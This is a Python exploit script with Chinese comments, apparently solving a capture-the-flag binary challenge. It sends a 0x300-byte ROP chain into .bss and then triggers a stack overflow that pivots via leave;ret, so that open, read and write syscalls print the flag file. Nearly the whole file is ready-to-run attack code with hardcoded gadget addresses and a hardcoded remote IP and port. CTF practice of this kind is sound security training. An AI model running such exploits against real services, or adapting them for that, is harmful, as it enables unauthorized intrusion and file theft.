#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""pivot_orw —— 栈迁移到 .bss + SYS_open/read/write 读 flag（静态链接、无 libc）

附件: attachments/pwn（ELF64，**静态链接**、非 PIE、canary、NX、Partial RELRO，带调试符号）
      vuln@0x401964、main@0x40198f；提示 `stage: ` / `overflow: `

思路（与手搓 p5.py 一致，仅端口 39321 -> 35302）:
  1) `stage: ` 把 0x300 字节写进 .bss（0x4b3ac0）——这里放 ORW ROP 链 + "flag" 字符串
  2) `overflow: ` 触发栈溢出：0x40 填充 + p64(bss) + leave;ret(0x40198d) -> 栈迁移
  3) 链：
       open("flag", 0)                    rax=2
       read(3, buf, 0x100)                rax=0，rdx 用 xchg rax,rdx 设置
       write(1, buf, 0x100)               rax=1
     最后把 flag 打到 stdout。

用法: python exp.py [HOST PORT]
"""
import re
import select
import socket
import struct
import sys
import time

HOST, PORT = "219.216.64.241", 35302
if len(sys.argv) >= 3:
    HOST, PORT = sys.argv[1], int(sys.argv[2])

BSS = 0x4B3AC0
LEAVE_RET = 0x40198D
POP_RDI = 0x47DE22
POP_RSI = 0x48264F
POP_RAX = 0x423603
XCHG_RAX_RDX = 0x41875A
SYSCALL = 0x40C8B6
FLAG_PTR = BSS + 0x180
BUF = BSS + 0x200
STAGE_SIZE = 0x300
FLAG_RE = re.compile(rb"(?:flag|nex|FLAG|NEX)\{[^}]{1,200}\}")
p64 = lambda x: struct.pack("<Q", x)


def flat(*items):
    out = b""
    for it in items:
        out += it if isinstance(it, bytes) else p64(it)
    return out


def read_until(s, token, timeout=5):
    buf = b""
    end = time.time() + timeout
    while token not in buf and time.time() < end:
        r, _, _ = select.select([s], [], [], 0.2)
        if r:
            d = s.recv(4096)
            if not d:
                break
            buf += d
    return buf


def read_for(s, sec):
    out = b""
    end = time.time() + sec
    while time.time() < end:
        r, _, _ = select.select([s], [], [], 0.2)
        if r:
            d = s.recv(4096)
            if not d:
                break
            out += d
    return out


def build_stage1():
    chain = flat(
        BSS,                              # leave 的 pop rbp 占位
        POP_RDI, FLAG_PTR, POP_RSI, 0, POP_RAX, 2, SYSCALL,      # open("flag", 0)
        POP_RDI, 3, POP_RSI, BUF, POP_RAX, 0x100, XCHG_RAX_RDX, POP_RAX, 0, SYSCALL,  # read(3, buf, 0x100)
        POP_RDI, 1, POP_RSI, BUF, POP_RAX, 0x100, XCHG_RAX_RDX, POP_RAX, 1, SYSCALL,  # write(1, buf, 0x100)
    )
    stage = bytearray(b"\x00" * STAGE_SIZE)
    stage[: len(chain)] = chain
    stage[0x180:0x185] = b"flag\x00"
    return bytes(stage)


def main():
    s = socket.create_connection((HOST, PORT), timeout=5)
    s.setblocking(False)
    print("[*] banner:", repr(read_until(s, b"stage: ")))

    s.sendall(build_stage1())
    print("[*] stage1 sent (%d bytes)" % STAGE_SIZE)

    print("[*] next:", repr(read_until(s, b"overflow: ")))
    stage2 = b"A" * 0x40 + p64(BSS) + p64(LEAVE_RET)
    s.sendall(stage2)
    print("[*] stage2 sent (%d bytes)" % len(stage2))

    out = read_for(s, 3)
    text = out.decode("utf-8", "replace")
    print("[*] output:", text.strip()[:800])
    m = FLAG_RE.search(out)
    if m:
        print("[+] FLAG:", m.group(0).decode())
        return 0
    print("[-] 没拿到 flag")
    return 1


if __name__ == "__main__":
    sys.exit(main())
